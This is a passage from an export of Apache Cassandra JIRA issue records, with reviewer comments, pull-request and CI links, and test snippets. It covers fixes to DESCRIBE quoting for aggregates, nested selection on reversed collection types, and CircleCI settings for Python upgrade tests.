;11/May/23 14:18;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,3000,,,0,3000,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,smiklosovic,,,,,,,,,,,,,,Correctness -> API / Semantic Implementation,,,,,,,,Low Hanging Fruit,Unit Test,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Thu May 11 16:06:51 UTC 2023,,,,,,,All,,,,"0|z18s0o:",9223372036854775807,,,,blerer,ycai,,,Normal,,4.0.0,,https://github.com/apache/cassandra/commit/75194201f1f06d120f246f6fad025ca5f672943d,,,,,,,,,Submitting fixes for the different branches,,,,,"10/Oct/22 23:08;bernardo.botella;Proposed fix:

||Branch||PR||
|trunk|[PR|https://github.com/apache/cassandra/pull/1907]|
|4.0|[PR|https://github.com/apache/cassandra/pull/1905]|
|3.11|[PR|https://github.com/apache/cassandra/pull/1906]|

[Circle 1|https://app.circleci.com/pipelines/github/bbotella/cassandra/43/workflows/5652e192-67e3-4f1c-b6c7-95b9e3326178]
[Circle 2|https://app.circleci.com/pipelines/github/bbotella/cassandra/42/workflows/7f7171c6-075b-4bb0-b394-d92a2e201827]
;;;","11/Oct/22 08:13;blerer;[~bernardo.botella] Thanks a lot for the patches :). Unfortunately, the approach you took for the patches is not the correct one (the C* code base isconfusing). Internally C* does not keep the quotes. It eliminates them on input and add them back when recreating the statements for the DESCRIBE.

I added some information in the *Description* section to help you find the parts of the code that need to be modified.

We changed the way DESCRIBE was working in C* 4.0 and moved it on the server side before that DESCRIBE was implemented at the CQLSH level using the python driver. This bug only affect 4.0, 4.1 and trunk. No need to worry about 3.11 :);;;","13/Oct/22 23:26;bernardo.botella;Hey [~blerer] thanks a lot for the directions! Hopefully this will make more sense.

Proposed fix:

||Branch||PR||
|trunk|[PR|https://github.com/apache/cassandra/pull/1907]|
|4.0|[PR|https://github.com/apache/cassandra/pull/1905]|;;;","24/Oct/22 22:04;bernardo.botella;[~yifanc] I just updated the trunk PR with a new unit test covering (hopefully) the missing cases.;;;","18/Nov/22 22:10;bernardo.botella;[~yifanc] New revision updated.;;;","29/Nov/22 23:22;yifanc;+1 on the patch to trunk. We will need an additional patch for cassandra-4.1 branch :|;;;","30/Nov/22 00:44;bernardo.botella;Here are the patches for the 3 branches:

||Branch||PR||Circle||
|trunk|[PR|https://github.com/apache/cassandra/pull/1907]|[Link|https://app.circleci.com/pipelines/github/bbotella/cassandra?branch=CASSANDRA-17918-trunk]|
|4.0|[PR|https://github.com/apache/cassandra/pull/2035]|[Link|https://app.circleci.com/pipelines/github/bbotella/cassandra?branch=CASSANDRA-17918-cassandra-4.0]|
|4.1|[PR|https://github.com/apache/cassandra/pull/2034]|[Link|https://app.circleci.com/pipelines/github/bbotella/cassandra?branch=CASSANDRA-17918-4.1]|;;;","01/Dec/22 23:56;yifanc;+1 on all the patches.

The entries in changes.txt need to be modified so it reflects the patched is merged up from 4.0 branch. I will modify changes.txt and run CI once again on committing. ;;;","02/Dec/22 17:43;yifanc;[~blerer] , can you take another look? ;;;","07/Dec/22 09:42;blerer;Thanks [~bernardo.botella]. The patch looks good to me. 
[~yifanc] were the new tests checked for flakiness?;;;","08/Dec/22 19:38;yifanc;Rebased all branches and started the full CI runs. I will run the repeated test for the new tests after those finishes. 

CI Results (pending):
||Branch||Source||Circle CI||
|cassandra-4.0|[branch|https://github.com/yifan-c/cassandra/tree/commit_remote_branch/CASSANDRA-17918-cassandra-4.0-F5705D26-0685-449B-98DB-523066CDC82C]|[build|https://app.circleci.com/pipelines/github/yifan-c/cassandra?branch=commit_remote_branch%2FCASSANDRA-17918-cassandra-4.0-F5705D26-0685-449B-98DB-523066CDC82C]|
|cassandra-4.1|[branch|https://github.com/yifan-c/cassandra/tree/commit_remote_branch/CASSANDRA-17918-cassandra-4.1-F5705D26-0685-449B-98DB-523066CDC82C]|[build|https://app.circleci.com/pipelines/github/yifan-c/cassandra?branch=commit_remote_branch%2FCASSANDRA-17918-cassandra-4.1-F5705D26-0685-449B-98DB-523066CDC82C]|
|trunk|[branch|https://github.com/yifan-c/cassandra/tree/commit_remote_branch/CASSANDRA-17918-trunk-F5705D26-0685-449B-98DB-523066CDC82C]|[build|https://app.circleci.com/pipelines/github/yifan-c/cassandra?branch=commit_remote_branch%2FCASSANDRA-17918-trunk-F5705D26-0685-449B-98DB-523066CDC82C]|;;;","08/Dec/22 21:17;yifanc;[~bernardo.botella], bunch of tests failed. Can you take a look? (See the circle CI links in my comment).;;;","27/Apr/23 12:23;smiklosovic;I will try to refresh this work, I will assign this to myself for a while due to the inactivity of the author. ;;;","04/May/23 14:47;smiklosovic;The problem with tests is that the patch introduces this result of aggregate description, for example it would describe an aggregate like this:
{code:java}
CREATE AGGREGATE cqlshtests_dligxmowmx.aggmax(int)
    SFUNC cqlshtests_dligxmowmx.""fmax""
    STYPE int; {code}
This does not work because the the value of SFUNC is in form ""keyspace.name"" and it does not accept this. There can not be ""."". It just expects name of the function.

[https://github.com/apache/cassandra/blob/trunk/src/antlr/Parser.g#L671]

[https://github.com/apache/cassandra/blob/trunk/src/antlr/Parser.g#L1567]

So the original author introduced something to CQL but parser was not modified.

I do not know how to fix this. I think we should just leave it out as it was and we should just quote the function name. If we are creating an aggregate on some keyspace, I do not think that SFUNC is going to ever be something else from a function in that keyspace. So the further distinction what keyspace that SFUNC is from does not make a lot of sense.

my PR for trunk is here which builds on top of the original work:

[https://github.com/apache/cassandra/pull/2308]

 

https://app.circleci.com/pipelines/github/instaclustr/cassandra/2177/workflows/36b2e8b5-1ea8-4579-bc4a-5dca6db4e07f;;;","05/May/23 09:48;blerer;[~smiklosovic] I would just add some function and aggregate to the {{testDescribeRoundtrip}} testcase as a safety net to the problem you raised but otherwise your patch looks good to me.;;;","05/May/23 09:49;smiklosovic;Thanks, I ll look at that.;;;","09/May/23 06:00;smiklosovic;[~blerer] would you formally +1 it, please?

4.0 https://github.com/apache/cassandra/pull/2316
4.1 https://github.com/apache/cassandra/pull/2315
trunk https://github.com/apache/cassandra/pull/2308

4.0 j8 [https://app.circleci.com/pipelines/github/instaclustr/cassandra/2182/workflows/4318dee4-ecbe-4bd2-9b16-19b95ef0a908]
4.0 j11 [https://app.circleci.com/pipelines/github/instaclustr/cassandra/2182/workflows/0a057ebc-7ddc-405d-a799-28e755b16430]

4.1 j8 [https://app.circleci.com/pipelines/github/instaclustr/cassandra/2187/workflows/5b533e45-dc6b-4321-9989-be75512d4b80]
4.1 j11 [https://app.circleci.com/pipelines/github/instaclustr/cassandra/2187/workflows/4e175503-d295-4bfb-9bdd-bede3748ccfe]

trunk j8 [https://app.circleci.com/pipelines/github/instaclustr/cassandra/2186/workflows/a3d43d13-482d-4925-84a2-ea618961ecaa]
trunk j11 [https://app.circleci.com/pipelines/github/instaclustr/cassandra/2186/workflows/eba2fa9a-93b2-4362-8b39-64f11909d53f];;;","09/May/23 20:09;yifanc;+1 on the patch. Thanks you [~smiklosovic] for taking it up and finding the issue with SFUNC/FINALFUNC/etc. ;;;","11/May/23 16:06;blerer;Sorry, I am late but adding my +1 for the record. Thanks [~smiklosovic];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Nested selection of reversed collections fails,CASSANDRA-17913,13482624,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,masokol,dcapwell,dcapwell,21/Sep/22 16:31,15/Apr/23 15:28,13/Jul/23 08:40,14/Apr/23 10:16,4.0.10,4.1.2,5.0,,,,Consistency/Coordination,CQL/Semantics,Legacy/Local Write-Read Paths,,0,,"The following test fails caused by the fact we make reversed a type that wraps the underline type
{code:java}
@Test
    public void testMapsReversed() throws Throwable
    {
        createTable(""CREATE TABLE %s ("" +
                    ""   k int, "" +
                    ""   c frozen<map<text, int>>, "" +
                    ""   v int, "" +
                    ""   PRIMARY KEY(k, c)"" +
                    "") WITH CLUSTERING ORDER BY (c DESC)"");

        execute(""SELECT c['testing'] FROM %s"");
    }
{code}
With the error
{code:java}
org.apache.cassandra.exceptions.InvalidRequestException: Invalid element selection: c is of type frozen<map<text, int>> is not a collection
{code}
When you look in a debugger you see that the real type is ReversedType(MapType(…)), so the current checks fail.

{+}Additional information for newcomers{+}:
 * The problem impact element selection as well as range selection that where introduced in CASSANDRA-7396 as part of 4.0. So the patch will need to be done for 4.0.
 * The checks that needs to be modified is in {{Selectable.WithElementSelection}} and {{Selectable.WithSliceSelection}}
 * The unit tests should be added to {{CollectionsTest}}",,brandon.williams,dcapwell,e.dimitrova,masokol,smiklosovic,,,,,,,,,,"smiklosovic opened a new pull request, #2270:
URL: https://github.com/apache/cassandra/pull/2270

   Thanks for sending a pull request! Here are some tips if you're new here:
    
    * Ensure you have added or run the [appropriate tests](https://cassandra.apache.org/_/development/testing.html) for your PR.
    * Be sure to keep the PR description updated to reflect all changes.
    * Write your PR title to summarize what this PR proposes.
    * If possible, provide a concise example to reproduce the issue for a faster review.
    * Read our [contributor guidelines](https://cassandra.apache.org/_/development/index.html)
    * If you're making a documentation change, see our [guide to documentation contribution](https://cassandra.apache.org/_/development/documentation.html)
    
   Commit messages should follow the following format:
   
   ```
   <One sentence description, usually Jira title or CHANGES.txt summary>
   
   <Optional lengthier description (context on patch)>
   
   patch by <Authors>; reviewed by <Reviewers> for CASSANDRA-#####
   
   Co-authored-by: Name1 <email1>
   Co-authored-by: Name2 <email2>
   
   ```
   
   The [Cassandra Jira](https://issues.apache.org/jira/projects/CASSANDRA/issues/)
   
   


;12/Apr/23 14:15;githubbot;600","smiklosovic opened a new pull request, #2271:
URL: https://github.com/apache/cassandra/pull/2271

   Thanks for sending a pull request! Here are some tips if you're new here:
    
    * Ensure you have added or run the [appropriate tests](https://cassandra.apache.org/_/development/testing.html) for your PR.
    * Be sure to keep the PR description updated to reflect all changes.
    * Write your PR title to summarize what this PR proposes.
    * If possible, provide a concise example to reproduce the issue for a faster review.
    * Read our [contributor guidelines](https://cassandra.apache.org/_/development/index.html)
    * If you're making a documentation change, see our [guide to documentation contribution](https://cassandra.apache.org/_/development/documentation.html)
    
   Commit messages should follow the following format:
   
   ```
   <One sentence description, usually Jira title or CHANGES.txt summary>
   
   <Optional lengthier description (context on patch)>
   
   patch by <Authors>; reviewed by <Reviewers> for CASSANDRA-#####
   
   Co-authored-by: Name1 <email1>
   Co-authored-by: Name2 <email2>
   
   ```
   
   The [Cassandra Jira](https://issues.apache.org/jira/projects/CASSANDRA/issues/)
   
   


;12/Apr/23 15:15;githubbot;600","smiklosovic opened a new pull request, #2272:
URL: https://github.com/apache/cassandra/pull/2272

   Thanks for sending a pull request! Here are some tips if you're new here:
    
    * Ensure you have added or run the [appropriate tests](https://cassandra.apache.org/_/development/testing.html) for your PR.
    * Be sure to keep the PR description updated to reflect all changes.
    * Write your PR title to summarize what this PR proposes.
    * If possible, provide a concise example to reproduce the issue for a faster review.
    * Read our [contributor guidelines](https://cassandra.apache.org/_/development/index.html)
    * If you're making a documentation change, see our [guide to documentation contribution](https://cassandra.apache.org/_/development/documentation.html)
    
   Commit messages should follow the following format:
   
   ```
   <One sentence description, usually Jira title or CHANGES.txt summary>
   
   <Optional lengthier description (context on patch)>
   
   patch by <Authors>; reviewed by <Reviewers> for CASSANDRA-#####
   
   Co-authored-by: Name1 <email1>
   Co-authored-by: Name2 <email2>
   
   ```
   
   The [Cassandra Jira](https://issues.apache.org/jira/projects/CASSANDRA/issues/)
   
   


;12/Apr/23 15:16;githubbot;600","masokol commented on PR #1978:
URL: https://github.com/apache/cassandra/pull/1978#issuecomment-1508297691

   Commited in https://github.com/apache/cassandra/commit/2fce3025c448316720d9cf7447fe7d1d34e17625


;14/Apr/23 10:30;githubbot;600","masokol closed pull request #1978: CASSANDRA-17913: Fix nested selection of reversed collections
URL: https://github.com/apache/cassandra/pull/1978


;14/Apr/23 10:30;githubbot;600","smiklosovic closed pull request #2270: CASSANDRA-17913 4.1 Fix nested selection of reversed collections
URL: https://github.com/apache/cassandra/pull/2270


;15/Apr/23 15:28;githubbot;600","smiklosovic closed pull request #2271: CASSANDRA-17913 4.0 Fix nested selection of reversed collections
URL: https://github.com/apache/cassandra/pull/2271


;15/Apr/23 15:28;githubbot;600","smiklosovic closed pull request #2272: CASSANDRA-17913 trunk Fix nested selection of reversed collections
URL: https://github.com/apache/cassandra/pull/2272


;15/Apr/23 15:28;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,4800,,,0,4800,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,masokol,,,,,,,,,,,,,,Correctness -> Unrecoverable Corruption / Loss,,,,,,,,Normal,Fuzz Test,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Fri Apr 14 10:18:26 UTC 2023,,,,,,,All,,,,"0|z18qtc:",9223372036854775807,,,,,,,,Normal,,4.0.0,,https://github.com/apache/cassandra/commit/2fce3025c448316720d9cf7447fe7d1d34e17625,,,,,,,,,unittests,,,,,"21/Sep/22 16:44;dcapwell;This was found in fuzz testing for the Accord Transaction syntax patch (https://github.com/maedhroz/cassandra/pull/4), for now Accord Fuzz tests need to ignore Reversed Types as normal read/write path has issues...;;;","07/Nov/22 09:47;masokol;[PR for 4.0|https://github.com/apache/cassandra/pull/1978]

I'm kinda new to this part of the code, i've added unittests for these changes to test different scenarios.

All tests in CollectionsTest are running green for me.

I've run circleCI but by the looks of it i don't have enough resources. I get similar failures for this PR and 4.0 branch. If someone could run CI that would be great.;;;","11/Jan/23 12:33;brandon.williams;[Here|https://app.circleci.com/pipelines/github/driftx/cassandra/748/workflows/a447f23b-f64a-4bf7-98df-fc10a4f3b797] is a circle j8 run for 4.0.;;;","23/Feb/23 15:13;brandon.williams;This looks good to me if you want to go ahead with 4.1 and trunk patches to get this finished.;;;","12/Apr/23 15:20;smiklosovic;I wrote [~masokol] privately and he agreed with myself finishing that.

PRs are here:

4.0 https://github.com/apache/cassandra/pull/2271
4.1 https://github.com/apache/cassandra/pull/2270
trunk https://github.com/apache/cassandra/pull/2272

There are subtle differences between all branches. In trunk, type is set in constructor but in 4.1 it is not. I extracted common logic to a method so there is not code duplication - in ElementSelector. I left changes in Selectable as they were originally introduced by Maciej. Classes in Selectable are just implementing Selectable, not an abstract class, and extracting that logic to that interface seems just strange.

I am building it as I write this.;;;","13/Apr/23 09:29;smiklosovic;4.0 https://github.com/apache/cassandra/pull/2271
4.1 https://github.com/apache/cassandra/pull/2270
trunk https://github.com/apache/cassandra/pull/2272

4.0 https://ci-cassandra.apache.org/view/patches/job/Cassandra-devbranch/2421/
4.1 https://ci-cassandra.apache.org/view/patches/job/Cassandra-devbranch/2424/
trunk https://ci-cassandra.apache.org/view/patches/job/Cassandra-devbranch/2423/
;;;","13/Apr/23 14:57;brandon.williams;Doublechecked with circle and also repeated the new tests:

||Branch||CI||
|[4.0|https://github.com/driftx/cassandra/tree/CASSANDRA-17913-4.0]|[j8|https://app.circleci.com/pipelines/github/driftx/cassandra/973/workflows/fd8f4eb8-478f-4bd2-9ab6-0ae2f5041197], [j11|https://app.circleci.com/pipelines/github/driftx/cassandra/973/workflows/9c320e3e-f6f2-4743-9e5c-d220f99b6fd4]|
|[4.1|https://github.com/driftx/cassandra/tree/CASSANDRA-17913-4.1]|[j8|https://app.circleci.com/pipelines/github/driftx/cassandra/972/workflows/67ae6f03-237a-4292-bad6-50587342216a], [j11|https://app.circleci.com/pipelines/github/driftx/cassandra/972/workflows/d36492c2-dfe7-4742-8174-c13a1fda247b]|
|[trunk|https://github.com/driftx/cassandra/tree/CASSANDRA-17913-trunk]|[j8|https://app.circleci.com/pipelines/github/driftx/cassandra/971/workflows/639a4f14-64f5-4583-8908-9a759f51459b], [j11|https://app.circleci.com/pipelines/github/driftx/cassandra/971/workflows/f0ccbda0-2f3c-4823-9516-7747a69861b8]|

No related failures, +1.;;;","14/Apr/23 10:18;smiklosovic;note: change fix version to 4.0.10 when such version is available to choose. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix CircleCI config for running Python upgrade tests on 3.0 and 3.11,CASSANDRA-17912,13482611,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,e.dimitrova,e.dimitrova,e.dimitrova,21/Sep/22 15:17,04/Nov/22 15:19,13/Jul/23 08:40,04/Nov/22 15:18,3.0.29,3.11.15,4.0.8,4.1-rc1,,,CI,,,,0,,"It was noticed that Circle CI pushes to run irrelevant for 3.0 and 3.11 Python upgrade tests. Those are properly skipped in Jenkins.

Example runs:

[CircleCI|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1931/workflows/39ef5261-a6bf-4e77-a412-e750e322a231/jobs/15293] - 3.0 run

[Jenkins|https://ci-cassandra.apache.org/view/patches/job/Cassandra-devbranch/1944/] - while typing this I actually noticed [one test|https://ci-cassandra.apache.org/view/patches/job/Cassandra-devbranch/1944/testReport/junit/dtest-upgrade.upgrade_tests.upgrade_through_versions_test/TestProtoV3Upgrade_AllVersions_RandomPartitioner_EndsAt_3_11_X_HEAD/test_parallel_upgrade_with_internode_ssl/] only looking suspicious in Jenkins as it ends the upgrade in 3.11 when we test 3.0... 

This is good to be fixed for two reasons - reduce the noise so we do not miss legit failures and we should not spend resources to try to run those tests. ",,adelapena,e.dimitrova,mck,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,CASSANDRA-17760,,,,,,,,,,,,CASSANDRA-17760,CASSANDRA-17930,,,,,,,,,,,,,CASSANDRA-17885,,,,,,,,,,,,0.0,e.dimitrova,,,,,,,,,,,,,,Correctness -> Test Failure,,,,,,,,Normal,User Report,,false,CASSANDRA-18007,,,,,,,,,,,,,,,,9223372036854775807,,None,,Fri Nov 04 15:17:13 UTC 2022,,,,,,,All,,,,"0|z18qqg:",9223372036854775807,,,,mck,,,,Normal,,,,https://github.com/apache/cassandra/commit/90fe8608a401dd086c8918a045d01ff288849f49,,,,,,,,,"This is the last 3.0 [patch|https://github.com/apache/cassandra/compare/cassandra-3.0...ekaterinadimitrova2:cassandra:17912-3.0?expand=1] and [run|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1971/workflows/8eb3b149-a84b-4f76-a061-e15df972492e/jobs/15600]
 * removed extra_env_args: 'RUN_STATIC_UPGRADE_MATRIX=true' (making us run all possible tests, this one should be removed in another ticket CASSANDRA-16348 directly from the DTEST repo) and tests_filter_pattern: '^upgrade_tests' (which was filtering to run only tests from the upgrade_tests dir but we have some also in the main dir)
 * changed to run the tests with DEBUG and not INFO, same we do in Jenkins and other branches. Easier for debugging 
 * propagated the changes to MIDRES and HIGHRES too and recreated the patch files even if they were still applicable. Otherwise we get confusing warnings when we raise resources without any real issue. 

Compared Jenkins and CircleCI and revised what tests get collected - only updating from and to 3.0

 ",,,,,"21/Sep/22 15:52;e.dimitrova;These are the arguments used in Jenkins (--execute-upgrade-tests-only --upgrade-target-version-only --upgrade-version-selection all) - [https://github.com/apache/cassandra-builds/blob/trunk/build-scripts/cassandra-dtest-pytest.sh#L91]

But we set only --execute-upgrade-tests in CircleCI - https://github.com/apache/cassandra/blob/cassandra-3.0/.circleci/config.yml#L787;;;","21/Sep/22 16:25;e.dimitrova;I just verified that, as expected, 4.0, 4.1 and trunk CircleCI config matches Jenkins.

Fix for [3.0|https://github.com/ekaterinadimitrova2/cassandra/commit/f99cff0621d00a86992dddecd9b6046b72086170]

Testing it [here|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1939/workflows/c06f6aeb-48b0-42d5-8952-af814341e782]

If things look good I will push it to 3.11 too. ;;;","21/Sep/22 21:29;e.dimitrova;All tests finished green. Unfortunately, I didn't find in Jenkins a final number of test runs to compare. I manually inspected what do we have in artifacts that we have representatives of the classes we expect for this version. Also, checked that the latest flaky tests were run, they just finished this time successfully by chance. 

Added a [patch|https://github.com/ekaterinadimitrova2/cassandra/commit/7f4d236dacffa9a587eb8b783b118869a6f0e5be], started testing for 3.11 - [https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1940/workflows/b822932d-e171-4490-b794-f1d35deee5d9]

 ;;;","21/Sep/22 22:48;e.dimitrova;3.11 still runs some tests that we shouldn't see {_}I think{_}... 

Also, I realized I have to update probably the repeated upgrade tests config too. It will be the same command just at one more place... ;;;","21/Sep/22 22:54;e.dimitrova;I suspect the 3.11 might be some weird Circle issue as other branches were running some old stuff which I am surprised to see here as it is a brand new branch?... with the same arguments Jenkins skips those tests... it's weird, I will have to dig more into this.;;;","22/Sep/22 17:00;e.dimitrova;On a second pass and also while reading into the upgrade_manifest and CASSANDRA-16328, it seems we are running the right tests. Now I think the issue is Jenkins not running udtfix tests but I think why they are skipped can be tackled separately?

I think this is ready for review, to summarize:

-[3.0 patch|https://github.com/ekaterinadimitrova2/cassandra/commit/f99cff0621d00a86992dddecd9b6046b72086170] [CI|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1939/workflows/c06f6aeb-48b0-42d5-8952-af814341e782]

-[3.11 patch|https://github.com/ekaterinadimitrova2/cassandra/commit/7f4d236dacffa9a587eb8b783b118869a6f0e5be]  [CI|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1940/workflows/b822932d-e171-4490-b794-f1d35deee5d9]

[~mck] , [~dcapwell] , anyone of you for review? 

I can open a follow up ticket for Jenkins. 

------

And some good news - the 3.0 upgrade tests run in Circle CI was brought from 1 hour 25 minutes to 47 minutes. 

------

Tried to run those locally and I am puzzled:
{code:java}
$pytest --execute-upgrade-tests-only --upgrade-target-version-only --upgrade-version-selection all --log-level=""DEBUG"" --cassandra-dir=........./cassandra upgrade_udtfix_test.py -rxXs
============================================================================================================ test session starts =============================================================================================================
platform darwin -- Python 3.8.13, pytest-3.6.4, py-1.9.0, pluggy-0.7.1
rootdir: /Users/ekaterina.dimitri/IdeaProjects/cassandra-dtest-d, inifile: pytest.ini
plugins: flaky-3.7.0, timeout-1.4.2, repeat-0.9.1
timeout: 900.0s
timeout method: signal
timeout func_only: False
collected 20 items                                                                                                                                                                                                                           
 
upgrade_udtfix_test.py ssssssssssssssssssss                                                                                                                                                                                            [100%]
========================================================================================================== short test summary info ===========================================================================================================
SKIP [16] upgrade_tests/upgrade_udtfix_test.py: test not applicable to env.
SKIP [2] /Users/ekaterina.dimitri/IdeaProjects/cassandra-dtest-d/conftest.py: 3.0.27 < 3.11.6
SKIP [2] /Users/ekaterina.dimitri/IdeaProjects/cassandra-dtest-d/conftest.py: 3.0.28 < 3.11.6
 
========================================================================================================= 20 skipped in 4.66 seconds =========================================================================================================
{code}
This is with plain cassandra-3.11 and also with the patched branch. Double-checked the build.xml version and it is correct...

From the test class:
{code:java}
 for path in build_upgrade_pairs():
    gen_class_name = UpgradeUDTFixTest.__name__ + '_' + path.name
    assert gen_class_name not in globals()
    spec = {'UPGRADE_PATH': path,
            '__test__': True}

    start_family = spec['UPGRADE_PATH'].starting_meta.family
    upgrade_family = spec['UPGRADE_PATH'].upgrade_meta.family
    start_family_applies = start_family == CASSANDRA_3_0
    upgrade_applies_to_env = RUN_STATIC_UPGRADE_MATRIX or start_family_applies
    cls = type(gen_class_name, (UpgradeUDTFixTest,), spec)
    if not upgrade_applies_to_env:
        add_skip(cls, 'test not applicable to env.')
    globals()[gen_class_name] = cls
{code}
Anyway, I think those should be run for 3.11? I can add more info to a follow up ticket for Jenkins. In a quick check I didn't see us setting for example RUN_STATIC_UPGRADE_MATRIX neither in CircleCI, nor in Jenkins. (I was trying to find out where the difference came from). I am not sure also how the version check can fail locally but not in CircleCI? And why at all fails...;;;","30/Sep/22 03:13;e.dimitrova;Alright, seems like we [set RUN_STATIC_UPGRADE_MATRIX|https://github.com/apache/cassandra/blob/cassandra-3.0/.circleci/config.yml#L752] in CircleCI config but I do not see it set anywhere in cassandra_builds?

Also, we set it in CircleCI config only for 3.0 and 3.11. ;;;","30/Sep/22 03:32;e.dimitrova;Alright, seems like the answer is in CASSANDRA-16328 which removed setting the RUN_STATIC_UPGRADE_MATRIX but only 4.0+

[~mck] , [~dcapwell] , [~marcuse] , any thoughts here?;;;","30/Sep/22 10:45;brandon.williams;RUN_STATIC_UPGRADE_MATRIX is definitely the culprit and runs all test combinations, valid or not.;;;","30/Sep/22 19:04;e.dimitrova;Indeed. I will remove it from 3.0 and 3.11 too and push a new patch soon;;;","30/Sep/22 21:51;e.dimitrova;So I pushed that change to 3.0 and 3.11 but still something doesn't click. 

If we look in butler there are two tests consistently failing that I cannot find in the CircleCI artifacts.

Then I check number of tests by looking into  [this Jenkins table of results|https://jenkins-cm4.apache.org/job/Cassandra-3.0/296/testReport/] which lists some numbers I sum up and the Circle numbers and they also don't click...

Something fishy is going on... I will keep on looking

[3.0 patch|https://github.com/apache/cassandra/compare/trunk...ekaterinadimitrova2:cassandra:17912-3.0?expand=1] - [CI run|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1971/workflows/8eb3b149-a84b-4f76-a061-e15df972492e/jobs/15600/tests]

[3.11 patch|https://github.com/apache/cassandra/compare/trunk...ekaterinadimitrova2:cassandra:17912-3.11?expand=1] - [CI run|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1972/workflows/f3615560-40d8-42a3-b0ff-f0c108409d25/jobs/15599];;;","30/Sep/22 22:11;e.dimitrova;I started doubting everything so I double-checked the 4.1 numbers -  they match in CircleCI and Jenkins;;;","01/Oct/22 00:31;e.dimitrova;We provide non-default [test_filter_pattern|https://github.com/apache/cassandra/blob/cassandra-3.0/.circleci/config-2_1.yml#L456] in 3.0 and 3.11 which identifies only the tests under upgrade_tests dir.

Without applying it, the way we do in 4.0+, we get additionally below tests in the list of tests to run:
{code:java}
+upgrade_crc_check_chance_test.py::TestCrcCheckChanceUpgrade::test_crc_check_chance_upgrade
+upgrade_internal_auth_test.py::TestAuthUpgrade::test_upgrade_to_22
+upgrade_internal_auth_test.py::TestAuthUpgrade::test_upgrade_to_30
+upgrade_internal_auth_test.py::TestAuthUpgrade::test_upgrade_legacy_table
{code}
Jenkins 3252 vs 3299 Circle

Still the calculation difference is more than only 4 tests... if I am looking at the right numbers in Jenkins

I don't see us doing [that filtering|https://github.com/apache/cassandra-builds/blob/trunk/build-scripts/cassandra-dtest-pytest.sh#L99] in Jenkins and it seems to me that we shouldn't do it, the way it is in 4.0+

I will continue on Monday

 ;;;","04/Oct/22 20:47;e.dimitrova;Alright, I think I figured it out. 

This is the last 3.0 [patch|https://github.com/apache/cassandra/compare/cassandra-3.0...ekaterinadimitrova2:cassandra:17912-3.0?expand=1] and [run|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1971/workflows/8eb3b149-a84b-4f76-a061-e15df972492e/jobs/15600]

Meaningful changes done: 
 * removed extra_env_args: 'RUN_STATIC_UPGRADE_MATRIX=true' (making us run all possible tests, this one should be removed in another ticket CASSANDRA-16348 directly from the DTEST repo) and tests_filter_pattern: '^upgrade_tests' (which was filtering to run only tests from the upgrade_tests dir but we have some also in the main dir)
 * changed to run the tests with DEBUG and not INFO, same we do in Jenkins and other branches. Easier for debugging 
 * propagated the changes to MIDRES and HIGHRES too and recreated the patch files even if they were still applicable. Otherwise we get confusing warnings. 

It seems in Jenkins some tests were not run, we just see a diff mark in the report and this constitutes for the 50 that I was wondering about.

Now I didn't find a Jenkins diff definition. I do not see so far any error messages or something. But I identified for example test_composite_index_collections being one of the tests that didn't run in the last #256 3.0 run in Jenkins. I do not understand why it was missed. It seems this diff variates - we see + and -

I can see it in my Circle CI run

If we agree here, I will propagate the last changes to 3.11 and push run there too.

[~mck] , [~dcapwell] can you review, please? ;;;","09/Oct/22 19:34;mck;+1;;;","26/Oct/22 22:53;e.dimitrova;For the record I think we are ready with this one but I am waiting for final rebase and CI runs of both 3.0 and 3.11 on CASSANDRA-17987.

There will be some merge conflicts to solve and it will be easier to do it in the smaller patch here for me than for [~adelapena] there and he is almost ready :) ;;;","27/Oct/22 11:05;adelapena;[~e.dimitrova] thanks for waiting on CASSANDRA-17987. Indeed it's easier to rebase the smaller patch over bigger one. It's very kind of you to wait for that one, please let me know if I can help with the rebase of this one :);;;","28/Oct/22 23:26;e.dimitrova;{quote}  It's very kind of you to wait for that one, please let me know if I can help with the rebase of this one 
{quote}
No worries, I know the pain

{quote} Indeed it's easier to rebase the smaller patch over bigger one. 
{quote}
